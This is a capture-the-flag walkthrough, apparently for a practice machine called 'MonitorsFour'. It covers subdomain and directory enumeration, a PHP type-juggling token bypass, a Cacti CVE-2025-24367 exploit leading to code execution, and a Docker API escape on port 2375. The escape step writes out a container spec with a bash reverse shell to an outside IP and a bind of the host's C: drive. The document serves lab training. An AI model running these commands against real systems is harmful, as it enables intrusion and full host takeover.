1. Enumerate ports
2. Enumerate directories
```
gobuster dir -u http://monitorsfour.htb/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
diresearch -u http://monitorsfour.htb -x 404
```
3. Enumerate sub-domains
```
wfuzz -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
```
4. Once you've all this information you can download the .env publicly available and obtained via dirsearch.
5. With the sub-domains enumeration you'll get the "cacti" subdomain
6. Now, going with the endpoint "/user" you can exploit a vulnerability present in PHP 8.3.27 which is "Type Juggling". This is because of how PHP treats "== vs \=\==", which can lead to unexpected behaviour.
7. Specific "Magic hashes" (String starting with 0e followed by numbers) are treated as scientific notation of 0 by PHP. p.e. "0e1234" == "0e9999" evaluates TRUE and "0e1234" == 0 evaluates TRUE
8. You can fuzz this type juggling with the following command:
```
ffuf -c -u http://monitorsfour.htb/user?token=FUZZ -w php_loose_comparison.txt -fw 4
```
9. 0e1234 will return a valid response, from which we can exfiltrate information about the admin user.
10. Now, cracking the password we know that the hash represents "wonderful1". Trying this in the "/login" endpoint will let us enter the dashboard panel. The only important information here is to know that the admin user is called "marcus".
11. With this information we can go to "cacti" and try the user/password combination "marcus/wonderful1". This will let us enter the cacti panel
12. Enumerating all the new information we'll come across the version number of the cacti web portal. With this data we can look for CVEs. After some research we should step into "CVE-2025-24367" (Graph template injection) which can lead to RCE.
13. Exploitation:
```
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git

nc -lvnp 4444

python exploit.py -u marcus -p wonderful1 -url http://cacti.monitorsfour.htb -i $attackerIp -l 4444
```
14. Now, inside the computer show the content of `/etc/resolv.conf`. This will give you information about a host that the docker container has contact with via an internal interface.
15. You can scan it's ports with the following command
```
fscan -h 192.168.65.7 -p 1-65535
```
16. This command will makes us aware of the vulnerability in port TCP 2375 which enables us to perform a (Docker API escape). This vulnerability is called "End game".
17. In order to exploit it we've to run the following commands
```
curl -s http://192.168.65.7:2375/images/json
```
To obtain the images hosted by the machine.
```
echo '{ "Image": "docker_setup-nginx-php:latest", "Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.173/5555 0>&1"], "HostConfig": { "Binds": ["/mnt/host/c:/host_root"] } }' > create_container.json
```
In order to create a file that will automatically create a container with the image "docker_setup-nginx-php:latest" and run the command "/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.173/5555'". Also, and the most important part of this file, it will bind the "/mnt/host/c" directory (The WSL directory that points to the root of Windows C:/) to the "/host_root" directory in our new container.
```
curl -H 'Content-Type: application/json' -d @create_container.json http://192.168.65.7:2375/containers/create -o response.json
```
It will send the previously created file to the vulnerable port to create the container specified.
```
nc -lvnp 5555
```
Run it in order to start the server to recieve the reverse shell
```
cid=$(grep -o '"Id":"[^"]*"' response.json | cut -d'"' -f4) curl -X POST http://192.168.65.7:2375/containers/$cid/start
```
This command will get the id of the container (stored in the response.json file created before) and send it in order to start the container.
18. Recieve the root reverse shell and go to the "/host_root" directory in order to see all the Windows machine files.